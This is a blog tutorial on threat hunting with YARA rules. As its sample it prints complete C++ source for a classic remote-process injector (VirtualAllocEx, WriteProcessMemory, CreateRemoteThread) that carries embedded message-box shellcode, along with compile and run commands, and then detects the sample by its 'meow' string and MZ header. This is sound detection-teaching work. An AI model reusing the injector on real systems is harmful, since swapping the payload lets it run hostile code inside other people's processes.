---
title:  "Malware analysis 3: threat hunting via YARA. Process injection example."
date:   2022-02-15 10:00:00 +0600
header:
  teaser: "/assets/images/40/2022-02-15_22-22.png"
categories:
  - tutorial
tags:
  - red team
  - blue team
  - malware
  - analysis
  - yara
---

ï·½

Hello, cybersecurity enthusiasts and white hackers!

![yara](/assets/images/40/2022-02-15_22-22.png){:class="img-responsive"}    

This is an introduction to my own YARA-based threat hunting research.     

### yara

When performing malware analysis, the analyst needs to collect every piece of information that can be used to identify malicious software. One of the techniques is [Yara](https://github.com/VirusTotal/yara) rules. In this post, I am going to explore Yara rules and how to use them in order to detect malware.    

**Yara** is an open-source tool that assists malware researchers to identify and classify malware samples by looking for certain characteristics.    

### detect malware with Yara rules

Let's discover how to use Yara rules to discover malware. For simplicity, first example is malware with [classic](/tutorial/2021/09/18/malware-injection-1.html) process injection logic:   

```cpp
/*
hack.cpp
classic payload injection example
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/02/15/malware-analysis-3.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// meow-meow messagebox payload (without encryption)
unsigned char my_payload[] =
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

unsigned int my_payload_len = sizeof(my_payload);

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer

  // parse process ID
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, my_payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" data between processes
  WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);
  return 0;
}

```

For checking correctness let's go to compile and run this code:   

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![yara](/assets/images/40/2022-02-15_22-46.png){:class="img-responsive"}    

```bash
.\hack.exe 4916
```

![yara](/assets/images/40/2022-02-15_12-43.png){:class="img-responsive"}    

As you can see, our simple malware example work perfectly.    

In Yara, each rule starts with a keyword `rule` followed by a *rule identifier*:   

![yara](/assets/images/40/2022-02-15_23-03.png){:class="img-responsive"}    

Rules are generally composed of two sections: *string* definition **(1)** and *condition* **(2)**:    

![yara](/assets/images/40/2022-02-15_23-06.png){:class="img-responsive"}    

Strings can be defined in text or hexadecimal form, as shown in the following example:    

![yara](/assets/images/40/2022-02-15_23-09.png){:class="img-responsive"}    

The condition section is where the logic of the rule resides. This section must contain a boolean expression telling under which circumstances a file or process satisfies the rule or not:    

![yara](/assets/images/40/2022-02-15_23-11.png){:class="img-responsive"}    

In our test rule, which is called meow, we are looking for all files that contain the word meow. To do this, we set the meow as string and as hexadecimal format in the rules:   

![yara](/assets/images/40/2022-02-15_22-03.png){:class="img-responsive"}    

![yara](/assets/images/40/2022-02-15_22-53.png){:class="img-responsive"}    

![yara](/assets/images/40/2022-02-15_23-09.png){:class="img-responsive"}    

### demo

Let's go to see everything in action. It's pretty simple:   

```bash
yara meow.yar ./hack.exe
```
![yara](/assets/images/40/2022-02-15_23-32.png){:class="img-responsive"}    

And it works!   

You can also check the whole folder recursively:    

```bash
cd ../
yara -r 2022-02-15-malware-analysis-3/meow.yar ./
```

![yara](/assets/images/40/2022-02-15_23-37.png){:class="img-responsive"}    

But I want to find only `.exe` files. For this, update our yara rule, add condition: all the valid PE files contain the value of the first two-byte as `4D` and `5A` (**"MZ"** in ASCII), named after **M**ark **Z**bikowsky, a well-known architect of MS-DOS.    

![yara](/assets/images/40/2022-02-15_23-42.png){:class="img-responsive"}    

So, update our code of yara rule file:   

![yara](/assets/images/40/2022-02-15_23-58.png){:class="img-responsive"}    

Then, run with new `meow.yar`:    

```bash
cd ../
yara -r 2022-02-15-malware-analysis-3/meow.yar ./
```

![yara](/assets/images/40/2022-02-15_23-50.png){:class="img-responsive"}    

As you can see Yara found all `pe`-files which contains `Meow-meow` string.    

Also found "evil" DLLs from the [previous](/pentest/2021/10/12/dll-hijacking-2.html) blog posts:    

![yara](/assets/images/40/2022-02-15_23-57.png){:class="img-responsive"}    

[Yara](https://github.com/VirusTotal/yara)    
[awesome-yara](https://github.com/InQuest/awesome-yara)    
[Classic code injection technique](/tutorial/2021/09/18/malware-injection-1.html)    
[source code on Github](https://github.com/cocomelonc/2022-02-15-malware-analysis-3)    

> This is a practical case for educational purposes only.      

Thanks for your time happy hacking and good bye!   
*PS. All drawings and screenshots are mine*
